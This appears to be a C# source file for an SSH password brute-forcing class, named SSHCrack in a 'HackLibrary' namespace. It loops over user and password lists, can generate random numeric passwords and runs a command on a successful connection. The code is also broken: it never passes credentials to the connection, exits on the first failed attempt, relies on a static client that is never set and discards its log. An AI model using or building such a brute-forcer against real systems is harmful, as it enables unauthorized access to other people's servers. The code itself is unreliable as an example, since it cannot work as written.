using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HackLibrary
{
    public static class SSHCrack
    {
        static SshClient Client;

        public static List<string> users = new List<string>();
        public static List<string> passwords = new List<string>();
        public static List<string> commands = new List<string>();
        public static string Host { get; set; }
        public static string Log { get; set; }
        public static string CommandOnConnect { get; set; }

        public static void SetPasswordsFromString(string passwordList)
        {
            passwords = passwordList.Split(',').ToList();
        }
        public static void SetUsersFromString(string userList)
        {
            users = userList.Split(',').ToList();
        }
        public static void SetPasswordsFromRandom(int count, int length)
        {
            Random rg = new Random();

            passwords.Clear();
            for (int i = 0; i < count; i++)
            {
                string passwordToAdd = rg.Next(1111, int.Parse(string.Concat(Enumerable.Repeat(9, length)))).ToString();
                passwords.Add(passwordToAdd);
            }
        }

        public static void AttemptConnect(SshClient client)
        {
            string log = "";
            foreach (string user in users)
            {
                log += $"Connecting to {user}@{Host}:\n";
                foreach (string pass in passwords)
                {
                    log += $"Trying {user}:{pass}";

                    client.Connect();
                    if (client != null)
                    {
                        if (!client.IsConnected)
                        {
                            return;
                        }
                        
                    }
                }
            }
            throw new TimeoutException { };
        }

        public static string SendCommand(SshClient client)
        {
            AttemptConnect(client);
            while (!Client.IsConnected)
            {

            }
            if (Client.IsConnected)
            {
                try
                {
                    return Client.RunCommand(CommandOnConnect).Result;
                }
                catch (TimeoutException ex)
                {
                    return ex.Message;
                }
            }
            else
            { return Log; }
        }
    }
}
